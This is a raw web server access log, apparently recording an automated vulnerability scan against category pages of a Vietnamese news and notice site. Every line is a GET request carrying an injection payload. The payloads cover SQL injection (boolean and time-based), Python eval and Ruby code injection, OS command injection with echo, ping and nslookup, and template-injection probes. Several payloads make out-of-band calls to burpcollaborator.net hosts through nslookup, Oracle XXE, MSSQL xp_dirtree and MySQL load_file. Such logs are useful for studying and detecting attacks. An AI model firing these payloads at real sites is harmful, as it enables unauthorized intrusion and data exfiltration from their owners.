GET /index.php/category/tin-tuc/tt-nckh'%20and%20'2169'%3d'2175/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20and%20'3908'%3d'3913/ ,1
GET /index.php/category/thong-bao/tb-nckh56586785'%20or%202259%3d2260--%20/ ,1
GET /index.php/category/tin-tuc'%20and%208005%3d8005--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20and%203003%3d3003--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20and%20'9088'%3d'9088/ ,1
GET /index.php/category/thong-bao/tb-khac'%20and%204644%3d4644--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac44679710'%20or%20'3706'%3d'3709/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%20and%204737%3d4740--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%20and%202412%3d2412--%20/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%20and%206416%3d6423--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20and%20'5607'%3d'5607/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20and%203995%3d3995--%20/ ,1
GET /index.php/category/tin-tuc'%20and%205315%3d5316--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20and%20'1489'%3d'1490/ ,1
GET /index.php/category/thong-bao/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac44884749'%20or%203101%3d3101--%20/ ,1
GET /index.php/category/thong-bao/tb-khac'%20and%203646%3d3655--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%20and%205169%3d5174--%20/ ,1
GET /index.php/category/thong-bao'%22%600%26nslookup%20-q%3dcname%20h4mlr4hi3g16mzmcg2wnke81lsrkumij6gt6hv.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%20and%209145%3d9151--%20/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20and%20'4556'%3d'4565/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20and%207236%3d7236--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac88711682'%20or%202695%3d2703--%20/ ,1
GET /index.php/category/thong-bao%26nslookup%20-q%3dcname%20ajxe6xwbi9gz1s15vvbgz7nu0l6d9fxal78xwm.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20ajxe6xwbi9gz1s15vvbgz7nu0l6d9fxal78xwm.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20and%203779%3d3779--%20/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%20and%208667%3d8668--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20and%20'2478'%3d'2478/ ,1
GET /index.php/category/thong-bao%7cecho%20dsl9td4086%20zcvgmttwcm%7c%7ca%20%23'%20%7cecho%20dsl9td4086%20zcvgmttwcm%7c%7ca%20%23%7c%22%20%7cecho%20dsl9td4086%20zcvgmttwcm%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kfmfj%20SYSTEM%20%22http%3a//j9tnw6mk8i68r1rel41ppgd3quwm0jomcjz9ny.burpcollab'%7c%7c'orator.net/%22%3e%25kfmfj%3b]%3e')%2c'/l')%20from%20dual)/ ,1
GET /index.php/category/thong-bao/tb-nckh'%20and%209095%3d9103--%20/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong%7d%7dy60pe'/%22%3cgkyp2/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20and%20'1814'%3d'1818/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh%7d%7dr7qlu'/%22%3cmn88y/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kfmfj%20SYSTEM%20%22http%3a//ap3ecx2bo9mz7s751vhg57tu6lcdga4esbf13q.burpcollab'%7c%7c'orator.net/%22%3e%25kfmfj%3b]%3e')%2c'/l')%20from%20dual)%7c%7c'/ ,1
GET /index.php/category/tin-tuc%7d%7dp9gmh'/%22%3crj2m9/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong%25%7dsdevu'/%22%3cdibnd/ ,1
GET /index.php/category/thong-bao/tb-khac%7d%7dlsqxa'/%22%3cpmx98/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20and%202401%3d2401--%20/ ,1
GET /index.php/category/tin-tuc/tt-nckh%7d%7dnph2q'/%22%3cfbefb/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh%25%7dxcmgz'/%22%3cyp1ta/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5crytvlebsxqvgg9gmacqxeo2bf2luprdi360tqhf.burpcollab'%2b'orator.net%5crsg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc%25%7dhwrnv'/%22%3ch3v9m/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%7d%7dqlc7b'/%22%3cmud5q/ ,1
GET /index.php/category/thong-bao/tb-hoc-bongndgtu%25%3eobgu7'/%22%3cngwkf/ ,1
GET /index.php/category/thong-bao/tb-khac%25%7dzrnps'/%22%3ccdpic/ ,1
GET /index.php/category/tin-tuc/tt-nckh%25%7de28nk'/%22%3cytdhf/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%20and%208400%3d8401--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%22%600%26nslookup%20-q%3dcname%20e9oiw1mf8d63rwr9lz1kpbdyqpwhzknhbey4mt.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-tin-chung/quy-trinhbpe0t%25%3essfld'/%22%3co3nl4/ ,1
GET /index.php/category/thong-bao'%7cecho%20efuda228sa%2047t5ak7du5%20%23xzwx/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c85bcsvi9472xnqn3htxel59smjsbw8kzbn8ayyn.burpcollab'%2b'orator.net%5cfyl'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tucsnuiq%25%3ewnli8'/%22%3cgdd8c/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%25%7dn851c'/%22%3ccza3p/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%7d%7dd1k8y'/%22%3cm2ed3/ ,1
GET /index.php/category/thong-bao/tb-khacrca4d%25%3ecpzma'/%22%3ccb950/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-nckhqyqj8%25%3et3mlx'/%22%3ctxkmc/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao%26nslookup%20-q%3dcname%20ob3sybopan8dt6tjn93urlf8szyr1uppdm0co1.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20ob3sybopan8dt6tjn93urlf8szyr1uppdm0co1.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/thong-bao/tb-nckh%7d%7djbw1f'/%22%3ci54ai/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c5ek91sr6d4buwnw0qq6bu2ipvg1855twlki78vx.burpcollab'%2b'orator.net%5celb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoit21sf%25%3eptkse'/%22%3cnonuw/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%25%7dqjw21'/%22%3cvqvz6/ ,1
GET /index.php/category/thong-bao/tb-khac'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao%7cecho%20gixyvuruk0%20xrufy2dj7r%7c%7ca%20%23'%20%7cecho%20gixyvuruk0%20xrufy2dj7r%7c%7ca%20%23%7c%22%20%7cecho%20gixyvuruk0%20xrufy2dj7r%7c%7ca%20%23/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/thong-bao/tb-nckh%25%7dxjtu7'/%22%3cito3e/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5czor3bm10nylo6h6u0kg54wsj5ab2fz3qwet1jp8.burpcollab'%2b'orator.net%5cmnb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20/ ,1
GET /index.php/category/tin-tuc'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/thong-bao/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-khac'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-taoi4rnr%25%3ez9chx'/%22%3cku9ak/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/thong-tin-chung/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/thong-bao/tb-nckhxo043%25%3ep7q8u'/%22%3chpr0v/ ,1
GET /index.php/category/tin-tuc/(select%20load_file('%5c%5c%5c%5c3457rqh4321smlmygow9k08nler6v3julii58tx.burpcollaborator.net%5c%5cnog'))/ ,1
GET /index.php/category/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'.sleep(20).'/ ,1
GET /index.php/category/thong-bao/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/thong-bao/tb-nckh'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac%7d%7deq8u1'/%22%3ceikp5/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'.sleep(20).'/ ,1
GET /index.php/category/thong-bao'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/category/tin-tuc'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%2b(select%20load_file('%5c%5c%5c%5clb0py8omak8at3tgn63rrif5swyo2lqct0qngb5.burpcollaborator.net%5c%5coyi'))%2b'/ ,1
GET /index.php/category/thong-bao/tb-khac'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-nckh'.sleep(20).'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%7cecho%20t544wp9ym2%209m3271gm6v%20%23xzwx/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac%25%7dk09zv'/%22%3cd6plt/ ,1
GET /index.php/category/thong-bao/tb-nckh'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'.sleep(20).'/ ,1
GET /index.php/category/thong-bao/tb-dao-tao%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/thong-bao/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-hop-taczv8tm%25%3enurr4'/%22%3cct3cy/ ,1
GET /index.php/category/tin-tuc/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'(select*from(select(sleep(20)))a)'/ ,1
GET /index.php/category/thong-bao/tb-nckh'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%2bsleep(20.to_i)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'.sleep(20).'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%2b(select*from(select(sleep(20)))a)%2b'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%20and%20(select*from(select(sleep(20)))a)--%20/ ,1
GET /index.php/category/thong-bao/tb-dao-tao'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%22%600%26nslookup%20-q%3dcname%20pohtbc1qnole676k0agv4ms950bsew2tqqdg15.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))/ ,1
GET /index.php/category/tin-tuc'%22%600%26nslookup%20-q%3dcname%203x17kqa4w2usflfy9op9d01neek6oycv0snib7.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%22%600%26nslookup%20-q%3dcname%20m8vqv9ln7l5bq4qhk70sojc6pxvpzgndbay0mp.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'.sleep(20).'/ ,1
GET /index.php/category/thong-bao/tb-khac'%22%600%26nslookup%20-q%3dcname%20ysu2fl5zrxpnagat4jk48vwi99f1i663u0hq5f.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong%26nslookup%20-q%3dcname%20z223pmf01yzokhkueku5iw6jjap2s6g14yrofd.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20z223pmf01yzokhkueku5iw6jjap2s6g14yrofd.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%22%600%26nslookup%20-q%3dcname%20oxpskbapwnudf6fj99pudl18ezkronck0hn7bw.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc%26nslookup%20-q%3dcname%207nvbau08m6kw5p52zsfd34rr4iaae22xqudk19.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%207nvbau08m6kw5p52zsfd34rr4iaae22xqudk19.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%20waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh%26nslookup%20-q%3dcname%20jtgng66ksiq8b1be54lp9gx3augmkd88w5jv7k.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20jtgng66ksiq8b1be54lp9gx3augmkd88w5jv7k.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-khac%26nslookup%20-q%3dcname%20x531skiy4w2mnfnshix3lu9hm8s0v5j07xunic.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20x531skiy4w2mnfnshix3lu9hm8s0v5j07xunic.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong%7cecho%20ec1ka9o36h%20qboibqdlhq%7c%7ca%20%23'%20%7cecho%20ec1ka9o36h%20qboibqdlhq%7c%7ca%20%23%7c%22%20%7cecho%20ec1ka9o36h%20qboibqdlhq%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/tt-nckh%26nslookup%20-q%3dcname%20if1m25sjehc7x0xdr37ovfj2wt2l6huci95zto.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20if1m25sjehc7x0xdr37ovfj2wt2l6huci95zto.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac')waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%22%600%26nslookup%20-q%3dcname%20bfuf2ysceac0xtx6rw7hv8jvwm2e68u5i25sth.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc%7cecho%2051okp6jddl%20lm2alsh6m3%7c%7ca%20%23'%20%7cecho%2051okp6jddl%20lm2alsh6m3%7c%7ca%20%23%7c%22%20%7cecho%2051okp6jddl%20lm2alsh6m3%7c%7ca%20%23/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh%7cecho%207w03wcsbtu%206fu5qj9sob%7c%7ca%20%23'%20%7cecho%207w03wcsbtu%206fu5qj9sob%7c%7ca%20%23%7c%22%20%7cecho%207w03wcsbtu%206fu5qj9sob%7c%7ca%20%23/ ,1
GET /index.php/category/thong-bao/tb-khac%7cecho%20mf5q47j2pz%20peaepi6vf8%7c%7ca%20%23'%20%7cecho%20mf5q47j2pz%20peaepi6vf8%7c%7ca%20%23%7c%22%20%7cecho%20mf5q47j2pz%20peaepi6vf8%7c%7ca%20%23/ ,1
GET /index.php/category/thong-bao/tb-nckh'%22%600%26nslookup%20-q%3dcname%20xvw1ik8yuwsmdfds7in3buzhc8i0mqanykla9z.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-nckh%7cecho%201wojply9ey%20o5a3p1082c%7c%7ca%20%23'%20%7cecho%201wojply9ey%20o5a3p1082c%7c%7ca%20%23%7c%22%20%7cecho%201wojply9ey%20o5a3p1082c%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%22%600%26nslookup%20-q%3dcname%20lvkpi88muksad3dg76nrbiz5cwiomhaeybl19q.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%2c0)waitfor%20delay'0%3a0%3a20'--/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%26nslookup%20-q%3dcname%20k2nop7fl1jz9k2kfe5uqih64jvpnthhc59szgo.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20k2nop7fl1jz9k2kfe5uqih64jvpnthhc59szgo.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-nckh%26nslookup%20-q%3dcname%201df50oq2c0aqvjvwpm57tyhluc044uspgm3cr1.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%201df50oq2c0aqvjvwpm57tyhluc044uspgm3cr1.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%26nslookup%20-q%3dcname%20vwvzji9wvutkedeq8go1cs0fd6jynrbmzjm9ay.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20vwvzji9wvutkedeq8go1cs0fd6jynrbmzjm9ay.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac93020508'%20or%20'3407'%3d'3407/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%7cecho%20jh8ep9fa32%2087k9lpcjuf%7c%7ca%20%23'%20%7cecho%20jh8ep9fa32%2087k9lpcjuf%7c%7ca%20%23%7c%22%20%7cecho%20jh8ep9fa32%2087k9lpcjuf%7c%7ca%20%23/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%7cecho%20xqucemmy3b%207tek5wxlq1%20%23xzwx/ ,1
GET /index.php/category/thong-bao/tb-nckh%7cecho%201iki2pdb10%20gaju86j6vx%7c%7ca%20%23'%20%7cecho%201iki2pdb10%20gaju86j6vx%7c%7ca%20%23%7c%22%20%7cecho%201iki2pdb10%20gaju86j6vx%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%7cecho%20xjx6mk1rp2%2040frnocfoe%7c%7ca%20%23'%20%7cecho%20xjx6mk1rp2%2040frnocfoe%7c%7ca%20%23%7c%22%20%7cecho%20xjx6mk1rp2%2040frnocfoe%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac87428064'%20or%20'5825'%3d'5826/ ,1
GET /index.php/category/tin-tuc'%7cecho%20ov93ktsmjl%20lg4mx15vor%20%23xzwx/ ,1
GET /index.php/category/thong-bao/tb-khac'%7cecho%204cc73nr50i%20woqufp1ucp%20%23xzwx/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh'%7cecho%20g91byv65uu%20kwqqxbidw3%20%23xzwx/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac'%22%600%26nslookup%20-q%3dcname%201df50oq2c0aqvjvwpm57tyhluc044zswgt3jr8.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/tin-tuc/tt-nckh'%7cecho%20qasrwjhfq4%20huzo9h4y5k%20%23xzwx/ ,1
GET /index.php/category/tin-tuc%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac64675962'%20or%209336%3d9336--%20/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac%26nslookup%20-q%3dcname%20axbekxabw9uzfsf59vpgd71uelkdo8c300nqbf.burpcollaborator.net.%26'%5c%22%600%26nslookup%20-q%3dcname%20axbekxabw9uzfsf59vpgd71uelkdo8c300nqbf.burpcollaborator.net.%26%60'/ ,1
GET /index.php/category/thong-bao/tb-khac%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/thong-tin-chung/quy-trinh%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/tin-tuc/tt-nckh%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac46025295'%20or%209049%3d9055--%20/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi'%7cecho%20v5uzprtb3e%20wvzlsyvu5e%20%23xzwx/ ,1
GET /index.php/category/tin-tuc/tt-hop-tac%7cecho%20ek61mszucg%206wg9824ccc%7c%7ca%20%23'%20%7cecho%20ek61mszucg%206wg9824ccc%7c%7ca%20%23%7c%22%20%7cecho%20ek61mszucg%206wg9824ccc%7c%7ca%20%23/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao'%7cecho%20e2xpzy9s07%20xoa9qwzz67%20%23xzwx/ ,1
GET /index.php/category/thong-bao/tb-nckh'%7cecho%20fbo9st6xg9%20zl4so6djio%20%23xzwx/ ,1
GET /index.php/category/thong-bao'%2b(function()%7bif(typeof%20jbvwi%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bjbvwi%3d1%3b%7d%7d())%2b'/ ,1
GET /index.php/category/tin-tuc/tt-tin-khac'%20and%20'7922'%3d'7922/ ,1
GET /index.php/category/tin-tuc/tt-doan-hoi%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/thong-bao/tb-hoc-bong'%7cping%20-c%2021%20127.0.0.1%20%23/ ,1
GET /index.php/category/thong-bao/tb-nckh%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
GET /index.php/category/tin-tuc/tt-dao-tao%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1/ ,1
